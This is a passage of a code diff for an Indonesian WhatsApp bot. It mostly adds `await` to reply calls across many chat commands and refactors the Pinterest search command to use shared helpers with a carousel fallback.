     if (!resultBuffer || resultBuffer.length < 1000)
-      replyV1("❌ API tidak mengembalikan gambar yang valid");
+      await replyV1("❌ API tidak mengembalikan gambar yang valid");
 
     // Kirim hasil
     await conn.sendMessage(
@@ -26098,7 +26126,7 @@ case 'tofigure2': {
 
   } catch (e) {
     console.error(e);
-    replyV1(`❌ Terjadi kesalahan: ${e.message}`);
+    await replyV1(`❌ Terjadi kesalahan: ${e.message}`);
   }
 }
 break;
@@ -26194,11 +26222,11 @@ if (/image/.test(mime)) {
   let media = await conn.downloadAndSaveMediaMessage(qw)
   const url = await CatBox(media)
       addResponList(m.chat, args1, args2, true, url, db_respon_list)
-      replyV1(`Sukses addlist respon\nKey: ${args1}`)
+      await replyV1(`Sukses addlist respon\nKey: ${args1}`)
       if (fs.existsSync(media)) fs.unlinkSync(media)
 } else {
   addResponList(m.chat, args1, args2, false, '-', db_respon_list)
-  replyV1(`Sukses addlist respon\nKey: ${args1}`)
+  await replyV1(`Sukses addlist respon\nKey: ${args1}`)
 }
 break
 
@@ -26210,7 +26238,7 @@ if (db_respon_list.length === 0) return replyV1(`Belum ada list respon didalam d
 if (!text) return replyV1(`Gunakan dengan cara ${prefix}dellist key\n\nContoh: ${prefix}dellist tes`)
 if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return replyV1(`List respon dengan key: ${q}\ntidak ada didalam grup ini!`)
 delResponList(m.chat, q.toLowerCase(), db_respon_list)
-replyV1(`Sukses dellist respon dengan key: ${q}`)
+await replyV1(`Sukses dellist respon dengan key: ${q}`)
 break
 
 case 'update':
@@ -26240,11 +26268,11 @@ if (/image/.test(mime)) {
   let media = await conn.downloadAndSaveMediaMessage(qw)
   const url = await CatBox(media)
       updateResponList(m.chat, args1, args2, true, url, db_respon_list)
-      replyV1(`Berhasil update respon list dengan key *${args1}*`)
+      await replyV1(`Berhasil update respon list dengan key *${args1}*`)
       if (fs.existsSync(media)) fs.unlinkSync(media)
 } else {
   updateResponList(m.chat, args1, args2, false, '-', db_respon_list)
-  replyV1(`Berhasil update respon list dengan key *${args1}*`)
+  await replyV1(`Berhasil update respon list dengan key *${args1}*`)
 }
 break
         
@@ -26276,7 +26304,7 @@ case 'listgrup': {
 
     } catch (err) {
         console.error('Error listgroup:', err)
-        replyV1(`❌ Gagal mengambil daftar grup.\n\n${err.message}`)
+        await replyV1(`❌ Gagal mengambil daftar grup.\n\n${err.message}`)
     }
 }
 break
@@ -26411,7 +26439,7 @@ case 'readmore': {
   if (!text.includes('|')) return replyV1('Gunakan tanda "|" untuk memisahkan bagian teks dengan efek readmore.\nContoh: .readmore aku | suka | kamu ❤️')
   const more = String.fromCharCode(8206).repeat(4001)
   const teks = text.split('|').join(more)
-  replyV1(teks)
+  await replyV1(teks)
 }
   break
   
@@ -26469,9 +26497,9 @@ case 'gpt': {
             }
         )
         
-        replyV1(data.choices[0].message.content)
+        await replyV1(data.choices[0].message.content)
     } catch (e) {
-        replyV1(e.message)
+        await replyV1(e.message)
     }
 }
 break
@@ -26542,7 +26570,7 @@ case 'balogo': {
         );
     } catch (e) {
         console.error('[ba-logo Handler Error]', e);
-        replyV1(`🍂 *Ups, gagal membuat logo!* \nDetail: ${e.message || e}`);
+        await replyV1(`🍂 *Ups, gagal membuat logo!* \nDetail: ${e.message || e}`);
     } finally {
     }
 };
@@ -26649,7 +26677,7 @@ case "fb": {
 
     } catch (e) {
         console.error(e)
-        replyV1("❌ Error FDownloader (kemungkinan kena limit / proteksi)")
+        await replyV1("❌ Error FDownloader (kemungkinan kena limit / proteksi)")
     }
 }
 break;
@@ -26837,7 +26865,7 @@ case 'quoteimg': {
 
   } catch (err) {
     console.error(err)
-    replyV1('Terjadi kesalahan saat mengambil foto profil atau membuat gambar.')
+    await replyV1('Terjadi kesalahan saat mengambil foto profil atau membuat gambar.')
   }
 }
 break
@@ -26889,7 +26917,7 @@ case 'cekgila': {
 
   const kata = komentar[Math.floor(Math.random() * komentar.length)]
 
-  replyV1(`🧠 Tes Kegilaan Hari Ini\n\n👤 Nama: ${nama}\n📊 Tingkat Gila: ${persen}%\n🗯️ Komentar: ${kata}`)
+  await replyV1(`🧠 Tes Kegilaan Hari Ini\n\n👤 Nama: ${nama}\n📊 Tingkat Gila: ${persen}%\n🗯️ Komentar: ${kata}`)
 }
 break
 
@@ -26907,7 +26935,7 @@ case 'cekwaras': {
     'Jir waras banget, curigua pendukung prabowo'
   ]
   const kata = komentar[Math.floor(Math.random() * komentar.length)]
-  replyV1(`🧘 *TES KEWARASAN*\n\n👤 Nama: ${nama}\n📊 Tingkat waras: ${persen}%`)
+  await replyV1(`🧘 *TES KEWARASAN*\n\n👤 Nama: ${nama}\n📊 Tingkat waras: ${persen}%`)
 }
 break
 
@@ -26988,7 +27016,7 @@ case 'serfikat': {
 
   } catch (e) {
     console.error(e)
-    replyV1('❌ Terjadi kesalahan saat mengambil gambar.')
+    await replyV1('❌ Terjadi kesalahan saat mengambil gambar.')
   }
 }
 break
@@ -27008,13 +27036,13 @@ case "motivasi": {
 
   } catch (e) {
     console.error(e);
-    replyV1("❌ Terjadi kesalahan saat mengambil data.");
+    await replyV1("❌ Terjadi kesalahan saat mengambil data.");
   }
 }
   break
 
 case "cekgempa": {
-    replyV1("Memproses pencarian");
+    await replyV1("Memproses pencarian");
     
     try {
         const response = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
@@ -27048,7 +27076,7 @@ case "cekgempa": {
         }
     } catch (error) {
         console.log(error);
-        replyV1("Terjadi kesalahan saat mengambil data gempa.");
+        await replyV1("Terjadi kesalahan saat mengambil data gempa.");
     }
 }
 break
@@ -27076,7 +27104,7 @@ const vcard = [
 return vcard }).join("")
 fs.writeFileSync(projectPath('library', 'database', 'contacts.vcf'), vcardContent, "utf8")
 } catch (err) {
-replyV1(err.toString())
+await replyV1(err.toString())
 } finally {
 if (m.chat !== m.sender) await replyV1(`*Berhasil membuat file kontak ✅*
 File kontak telah dikirim ke private chat
@@ -27111,7 +27139,7 @@ const vcard = [
 return vcard }).join("")
 fs.writeFileSync(projectPath('library', 'database', 'contacts.vcf'), vcardContent, "utf8")
 } catch (err) {
-replyV1(err.toString())
+await replyV1(err.toString())
 } finally {
 if (m.chat !== m.sender) await replyV1(`*Berhasil membuat file kontak ✅*
 File kontak telah dikirim ke private chat
@@ -27167,7 +27195,7 @@ break
 
 case "skiplink": {
     if (!text) return replyV1(`Contoh : .skiplink https://sub4unlock.co/S9oU0`);
-    replyV1('wett')
+    await replyV1('wett')
     try {
         let api = `https://fgsi.koyeb.app/api/tools/skip/sub4unlock?apikey=APIKEY&url=${encodeURIComponent(text)}`;
         let { data: json } = await axios.get(api);
@@ -27178,7 +27206,7 @@ case "skiplink": {
 
         await replyV1(`${json.data.linkGo}`);
     } catch (err) {
-        replyV1(`Eror kak : ${err.message}`)
+        await replyV1(`Eror kak : ${err.message}`)
     }
 };
 break
@@ -27203,20 +27231,20 @@ const fb = async (urlFesnuk) => {
 
 case "fb": {
     if (!text) return replyV1(`Contoh : .fb https://www.facebook.com/share/v/...`)
-    replyV1('wett')
+    await replyV1('wett')
     try {
         const { hd, sd } = await fb(text)
         const videoUrl = hd || sd
         await conn.sendFile(m.chat, videoUrl, '_zenwik.mp4', '', m)
     } catch (e) {
-        replyV1(`Eror kak : ${e.message}`)
+        await replyV1(`Eror kak : ${e.message}`)
     }
 }
 break
 
 case "metaai": {
     if (!text) return replyV1("*Contoh:* .metaai Apa itu JavaScript?");
-    replyV1(mess.wait);
+    await replyV1(mess.wait);
     try {
         const apiUrl = `https://api.siputzx.my.id/api/ai/metaai?query=${encodeURIComponent(q)}`;
         const response = await axios.get(apiUrl);
@@ -27225,11 +27253,11 @@ case "metaai": {
         if (data.status && data.data) {
             await replyV1(`*Meta AI*\n\n${data.data}`);
         } else {
-            replyV1("❌ Gagal mendapatkan respons dari Meta AI");
+            await replyV1("❌ Gagal mendapatkan respons dari Meta AI");
         }
     } catch (error) {
         console.error("Meta AI Error:", error);
-        replyV1(mess.error);
+        await replyV1(mess.error);
     }
 }
 break
@@ -27246,7 +27274,7 @@ case 'accall': {
     const jids = pendingList.map(v => v.jid);
     await conn.groupRequestParticipantsUpdate(m.chat, jids, 'approve');
 
-    replyV1(`✅ Berhasil ACC *${jids.length}* member.`);
+    await replyV1(`✅ Berhasil ACC *${jids.length}* member.`);
 }
 break;
 
@@ -27331,51 +27359,35 @@ case 'pinterestdl': {
         }
     }
 
-    // Query mode uses the same Pinterest search helper and fallback provider
-    // already used by Xeryuu's .pin command; no guessed endpoint is introduced.
+    // Query mode uses the shared Pinterest search helper with correct request headers
+    // and a provider fallback, avoiding the old raw request that often received HTTP 403.
     const query = input.slice(0, 160)
     await conn.sendMessage(m.chat, { react: { text: '🔎', key: m.key } }).catch(() => {})
     try {
-        let results = []
-        try {
-            const scraped = await pinterest2(query)
-            results = (Array.isArray(scraped) ? scraped : []).map(item => ({
-                image: item?.images_url,
-                title: String(item?.grid_title || query).slice(0, 120),
-                source: item?.pin || item?.link || ''
-            })).filter(item => typeof item.image === 'string' && /^https:\/\//i.test(item.image))
-        } catch (error) {
-            console.warn('[PINDL QUERY PRIMARY]', error?.message || error)
-        }
-        if (!results.length) {
-            try {
-                const apiResponse = await axios.get('https://api.siputzx.my.id/api/s/pinterest', {
-                    params: { query }, timeout: 20000, maxContentLength: 5 * 1024 * 1024,
-                    headers: { Accept: 'application/json', 'User-Agent': 'Mozilla/5.0 (compatible; Xeryuu-MD Pinterest search)' }
-                })
-                const payload = apiResponse?.data
-                const items = Array.isArray(payload) ? payload :
-                    (Array.isArray(payload?.data) ? payload.data :
-                    (Array.isArray(payload?.result) ? payload.result :
-                    (Array.isArray(payload?.results) ? payload.results : [])))
-                results = items.map(item => ({
-                    image: item?.images_url || item?.image || item?.imageUrl || item?.url || item?.src || item?.images?.orig?.url || item?.images?.['736x']?.url,
-                    title: String(item?.grid_title || item?.title || item?.name || query).slice(0, 120),
-                    source: item?.pin || item?.link || item?.source || ''
-                })).filter(item => typeof item.image === 'string' && /^https:\/\//i.test(item.image))
-            } catch (error) {
-                console.warn('[PINDL QUERY FALLBACK]', error?.response?.status || error?.message || error)
-            }
-        }
-        if (!results.length) return replyV1(`❌ Tidak ada hasil yang dapat diambil untuk “${query}”. Pinterest atau provider pencarian mungkin membatasi akses; coba query lebih spesifik atau kirim tautan pin publik.`)
+        const results = (await pinterestSearch(query)).map(item => ({
+            image: item?.images_url,
+            title: String(item?.grid_title || query).slice(0, 120),
+            source: item?.pin || item?.link || ''
+        })).filter(item => typeof item.image === 'string' && /^https:\/\//i.test(item.image))
+        if (!results.length) return replyV1(`❌ Tidak ada hasil Pinterest yang tersedia untuk “${query}”. Pinterest/provider mungkin sedang membatasi permintaan atau tidak memiliki hasil. Coba lagi setelah jeda.`)
+        const selectedResults = results.slice(0, 5)
         let sent = 0
-        for (const item of results.slice(0, 3)) {
+        let usedCarousel = false
+        if (selectedResults.length >= 2) {
             try {
-                await conn.sendMessage(m.chat, { image: { url: item.image }, caption: `📌 ${item.title || query}\n${item.source || 'Hasil pencarian Pinterest'}` }, { quoted: m })
-                sent++
-            } catch (error) { console.warn('[PINDL QUERY SEND]', error?.message || error) }
+                sent = await sendPinterestCarousel(conn, m, selectedResults, query, 5)
+                usedCarousel = sent >= 2
+            } catch (carouselError) {
+                console.warn('[PINDL CAROUSEL FALLBACK]', carouselError?.message || carouselError)
+                sent = await sendPinterestSearchFallback(conn, m, selectedResults, query, 5)
+            }
+        } else {
+            sent = await sendPinterestSearchFallback(conn, m, selectedResults, query, 5)
         }
-        if (!sent) return replyV1('❌ Hasil ditemukan, tetapi tidak berhasil dikirim ke WhatsApp.')
+        if (!sent) return replyV1('❌ Hasil ditemukan, tetapi WhatsApp gagal mengirim gambar. Coba lagi nanti.')
+        if (!usedCarousel && selectedResults.length >= 2) {
+            await replyV1('ℹ️ Library WhatsApp saat ini tidak berhasil mengirim format carousel; hasil dikirim sebagai foto terpisah.')
+        }
         await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } }).catch(() => {})
         return
     } catch (error) {
@@ -27429,10 +27441,10 @@ case "rch2": {
                 failed++;
             }
         }
-        replyV1(`✅ Berhasil kirim reaction *${emoji}* ke ${success} pesan di channel *${metadata.name}*\n❌ Gagal di ${failed} pesan`);
+        await replyV1(`✅ Berhasil kirim reaction *${emoji}* ke ${success} pesan di channel *${metadata.name}*\n❌ Gagal di ${failed} pesan`);
     } catch (err) {
         console.error(err);
-        replyV1("❌ Gagal memproses permintaan!");
+        await replyV1("❌ Gagal memproses permintaan!");
     }
 }
 break
@@ -27465,9 +27477,9 @@ case 'kontol': {
             }
         )
         
-        replyV1(data.choices[0].message.content)
+        await replyV1(data.choices[0].message.content)
     } catch (e) {
-        replyV1(e.message)
+        await replyV1(e.message)
     }
 }
 break
@@ -27551,10 +27563,10 @@ case 'tovn': case 'toptt': case 'tovoice': {
             ptt: true
         }, { quoted: m });
 
-        replyV1('✅ Audio berhasil dikonversi menjadi PTT!');
+        await replyV1('✅ Audio berhasil dikonversi menjadi PTT!');
     } catch (err) {
         console.error(err);
-        replyV1('❌ Terjadi kesalahan saat mengkonversi audio menjadi PTT.');
+        await replyV1('❌ Terjadi kesalahan saat mengkonversi audio menjadi PTT.');
     }
 }
 break
@@ -27573,9 +27585,9 @@ case 'conves': {
 
     try {
         await conn.sendMessage(number, { text: pesan });
-        replyV1(`Berhasil mengirim pesan ke ${number}`);
+        await replyV1(`Berhasil mengirim pesan ke ${number}`);
     } catch (err) {
-        replyV1(`Gagal mengirim pesan: ${err.message}`);
+        await replyV1(`Gagal mengirim pesan: ${err.message}`);
     }
 }
 break
@@ -27598,7 +27610,7 @@ await conn.sendMessage(m.chat, {
   fileName: `${title}.mp3`,
 }, { quoted: m })
  
-} catch (err) { replyV1(`❌ Error\nLogs error : ${err.message}`) } }
+} catch (err) { await replyV1(`❌ Error\nLogs error : ${err.message}`) } }
 break
 
 case 'ah': {
@@ -27633,7 +27645,7 @@ case 'ah': {
     }, { quoted: m });
   } catch (err) {
     console.error(err);
-    replyV1(`*Terjadi kesalahan!* 😭\n${err.message || err}`);
+    await replyV1(`*Terjadi kesalahan!* 😭\n${err.message || err}`);
   }
 }
 break
@@ -27652,7 +27664,7 @@ case 'google': {
                     teks += `• Deskripsi: ${item.snippet}\n`
                     teks += `• Link: ${item.link}\n\n`
                   })
-                  replyV1(teks)
+                  return replyV1Safe(teks)
                 } else {
                   return replyV1('Tidak ada hasil yang ditemukan')
                 }
@@ -27706,7 +27718,7 @@ case 'playch': {
         await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
     } catch (err) {
         console.error(err);
-        replyV1('❌ Terjadi kesalahan saat mengirim audio ke saluran.');
+        await replyV1('❌ Terjadi kesalahan saat mengirim audio ke saluran.');
         await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
     }
 }
@@ -28478,16 +28490,16 @@ break
                     "Gorong-gorong",
                 ])
                 const response = `🔮 CEK KHODAM\n\n👤 Nama: ${namaKhodam}\n🧿 Khodam: ${khodam}\n\n_Hasil acak, hanya untuk hiburan._`
-                replyV1(response)
+                await replyV1(response)
             }
                 break
 
 case 'totalfitur': {
     try {
         let total = totalfitur();
-        replyV1(`Total fitur aktif saat ini: ${total} fitur!`);
+        await replyV1(`Total fitur aktif saat ini: ${total} fitur!`);
     } catch (e) {
-        replyV1(`Gagal membaca total fitur:\n${e.message}`);
+        await replyV1(`Gagal membaca total fitur:\n${e.message}`);
     }
 }
 break
@@ -28555,7 +28567,7 @@ break
 case 'lemonmail': {
  const argsxx = text.split('|'); if (argsxx.length < 3) return replyV1('Format salah! Gunakan: email|subject|pesan');
 const [target, subject, message] = argsxx;
-        replyV1('Mengirim email...');
+        await replyV1('Mengirim email...');
         try {
             const data = JSON.stringify({ "to": target.trim(), "subject": subject.trim(), "message": message.trim() });
             const config = {
@@ -28579,9 +28591,9 @@ const [target, subject, message] = argsxx;
             };
             const axios = require('axios');
             const api = await axios.request(config);
-            replyV1(`Hasil: ${JSON.stringify(api.data, null, 2)}`);
+            await replyV1(`Hasil: ${JSON.stringify(api.data, null, 2)}`);
         } catch (error) {
-            replyV1(`Error: ${error.message}`);
+            await replyV1(`Error: ${error.message}`);
         }
         }
         break
@@ -28704,10 +28716,10 @@ ${res.data.rating.map(it => `> *${it.label}:* ${fixed(it.confidence || 0)}%`).jo
 *⎣⧉⎤ Tag*
 ${res.data.tags.list.map(it => `> *${it.label}:* ${fixed(it.confidence || 0)}%`).join('\n')}
 `.trim()
-    replyV1(teks)
+    await replyV1(teks)
   } catch (e) {
     console.error(e)
-    replyV1(`Terjadi kesalahan saat mendeteksi karakter!\n\n${e.message}`)
+    await replyV1(`Terjadi kesalahan saat mendeteksi karakter!\n\n${e.message}`)
   }
 }
 break
@@ -28789,7 +28801,7 @@ break
 
 case "searchsticker": {
     if (!text) return replyV1('Sticker Apa Yg Kamu Cari?')
-    replyV1('_Sedang Mencari Sticker..._');
+    await replyV1('_Sedang Mencari Sticker..._');
     
     try {
         let apiUrl = `https://api.agatz.xyz/api/sticker?message=${encodeURIComponent(text)}`;
@@ -28845,14 +28857,14 @@ case "searchsticker": {
         }
 
         if (successCount < maxStickers) {
-            replyV1(`Berhasil mengirim ${successCount} sticker dari ${maxStickers} yang dicoba`);
+            await replyV1(`Berhasil mengirim ${successCount} sticker dari ${maxStickers} yang dicoba`);
         } else if (response.data.sticker_url.length > 10) {
-            replyV1(`Menampilkan ${successCount} sticker random dari ${response.data.sticker_url.length} sticker yang ditemukan`);
+            await replyV1(`Menampilkan ${successCount} sticker random dari ${response.data.sticker_url.length} sticker yang ditemukan`);
         }
 
     } catch (e) {
         console.error('Error in stickersearch:', e);
-        replyV1('Terjadi kesalahan saat mencari sticker');
+        await replyV1('Terjadi kesalahan saat mencari sticker');
     }
 }
 break
@@ -28862,7 +28874,7 @@ case 'artimimpi': case 'tafsirmimpi': {
 if (!text) return replyV1(`Contoh : ${command} belanja`)
 let anu = await primbon.tafsir_mimpi(text)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Mimpi :* ${anu.message.mimpi}\n• *Arti :* ${anu.message.arti}\n• *Solusi :* ${anu.message.solusi}`)
+await replyV1(`• *Mimpi :* ${anu.message.mimpi}\n• *Arti :* ${anu.message.arti}\n• *Solusi :* ${anu.message.solusi}`)
 }
 break
 case 'ramalanjodoh': case 'ramaljodoh': {
@@ -28871,7 +28883,7 @@ if (!text) return replyV1(`Contoh : ${command} Dika, 7, 7, 2005, Novia, 16, 11, 
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
+await replyV1(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'ramalanjodohbali': case 'ramaljodohbali': {
@@ -28880,7 +28892,7 @@ if (!text) return replyV1(`Contoh : ${command} Dika, 7, 7, 2005, Novia, 16, 11, 
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
+await replyV1(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'suamiistri': {
@@ -28889,7 +28901,7 @@ if (!text) return replyV1(`Contoh : ${command} Dika, 7, 7, 2005, Novia, 16, 11, 
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Nama Suami :* ${anu.message.suami.nama}\n• *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n• *Nama Istri :* ${anu.message.istri.nama}\n• *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
+await replyV1(`• *Nama Suami :* ${anu.message.suami.nama}\n• *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n• *Nama Istri :* ${anu.message.istri.nama}\n• *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'ramalancinta': case 'ramalcinta': {
@@ -28898,7 +28910,7 @@ if (!text) return replyV1(`Contoh : ${command} Dika, 7, 7, 2005, Novia, 16, 11, 
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}\n• *Catatan :* ${anu.message.catatan}`)
+await replyV1(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'artinama': {
@@ -28906,7 +28918,7 @@ case 'artinama': {
 if (!text) return replyV1(`Contoh : ${command} Dika Ardianta`)
 let anu = await primbon.arti_nama(text)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Nama :* ${anu.message.nama}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
+await replyV1(`• *Nama :* ${anu.message.nama}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'kecocokannama': case 'cocoknama': {
@@ -28915,7 +28927,7 @@ if (!text) return replyV1(`Contoh : ${command} Dika, 7, 7, 2005`)
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Life Path :* ${anu.message.life_path}\n• *Destiny :* ${anu.message.destiny}\n• *Destiny Desire :* ${anu.message.destiny_desire}\n• *Personality :* ${anu.message.personality}\n• *Persentase :* ${anu.message.persentase_kecocokan}`)
+await replyV1(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Life Path :* ${anu.message.life_path}\n• *Destiny :* ${anu.message.destiny}\n• *Destiny Desire :* ${anu.message.destiny_desire}\n• *Personality :* ${anu.message.personality}\n• *Persentase :* ${anu.message.persentase_kecocokan}`)
 }
 break
 case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
@@ -28933,7 +28945,7 @@ if (!text) return replyV1(`Contoh : ${command} 6, 12, 2020`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Tanggal Pernikahan :* ${anu.message.tanggal}\n• *karakteristik :* ${anu.message.karakteristik}`)
+await replyV1(`• *Tanggal Pernikahan :* ${anu.message.tanggal}\n• *karakteristik :* ${anu.message.karakteristik}`)
 }
 break
 case 'sifatusaha': {
@@ -28942,7 +28954,7 @@ if (!text) return replyV1(`Contoh : ${prefix + command} 28, 12, 2021`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Lahir :* ${anu.message.hari_lahir}\n• *Usaha :* ${anu.message.usaha}`)
+await replyV1(`• *Lahir :* ${anu.message.hari_lahir}\n• *Usaha :* ${anu.message.usaha}`)
 }
 break
 case  ' rejeki': case 'rezeki': {
@@ -28951,7 +28963,7 @@ if (!text) return replyV1(`Contoh : ${command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Lahir :* ${anu.message.hari_lahir}\n• *Rezeki :* ${anu.message.rejeki}\n• *Catatan :* ${anu.message.catatan}`)
+await replyV1(`• *Lahir :* ${anu.message.hari_lahir}\n• *Rezeki :* ${anu.message.rejeki}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'pekerjaan': {
@@ -28960,7 +28972,7 @@ if (!text) return replyV1(`Contoh : ${command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Lahir :* ${anu.message.hari_lahir}\n• *Pekerjaan :* ${anu.message.pekerjaan}\n• *Catatan :* ${anu.message.catatan}`)
+await replyV1(`• *Lahir :* ${anu.message.hari_lahir}\n• *Pekerjaan :* ${anu.message.pekerjaan}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'ramalannasib': case 'ramalnasib': case 'nasib': {
@@ -28969,7 +28981,7 @@ if (!text) return replyV1(`Contoh : 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.ramalan_nasib(tgl, bln, thn)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Analisa :* ${anu.message.analisa}\n• *Angka Akar :* ${anu.message.angka_akar}\n• *Sifat :* ${anu.message.sifat}\n• *Elemen :* ${anu.message.elemen}\n• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`)
+await replyV1(`• *Analisa :* ${anu.message.analisa}\n• *Angka Akar :* ${anu.message.angka_akar}\n• *Sifat :* ${anu.message.sifat}\n• *Elemen :* ${anu.message.elemen}\n• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`)
 }
 break
 case 'potensipenyakit': case 'penyakit': {
@@ -28978,7 +28990,7 @@ if (!text) return replyV1(`Contoh : ${command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Analisa :* ${anu.message.analisa}\n• *Sektor :* ${anu.message.sektor}\n• *Elemen :* ${anu.message.elemen}\n• *Catatan :* ${anu.message.catatan}`)
+await replyV1(`• *Analisa :* ${anu.message.analisa}\n• *Sektor :* ${anu.message.sektor}\n• *Elemen :* ${anu.message.elemen}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'artitarot': case 'tarot': {
@@ -28996,7 +29008,7 @@ if (!text) return `Contoh : ${command} Dika, 1, 2005\n\nNote : ${command} Nama, 
 let [nama, gender, tahun] = text.split`,`
 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
 if (anu.status == false) return replyV1(anu.message)
-replyV1(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tahun_lahir}\n• *Gender :* ${anu.message.jenis_kelamin}\n• *Angka Kua :* ${anu.message.angka_kua}\n• *Kelompok :* ${anu.message.kelompok}\n• *Karakter :* ${anu.message.karakter}\n• *Sektor Baik :* ${anu.message.sektor_baik}\n• *Sektor Buruk :* ${anu.message.sektor_buruk}`)
+await replyV1(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tahun_lahir}\n• *Gender :* ${anu.message.jenis_kelamin}\n• *Angka Kua :* ${anu.message.angka_kua}\n• *Kelompok :* ${anu.message.kelompok}\n• *Karakter :* ${anu.message.karakter}\n• *Sektor Baik :* ${anu.message.sektor_baik}\n• *Sektor Buruk :* ${anu.message.sektor_buruk}`)
 }
 break
 case 'haribaik': {
@@ -29005,7 +29017,7 @@ if (!text) return replyV1(`Contoh : ${command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.petung_hari_baik(tgl, bln, thn)
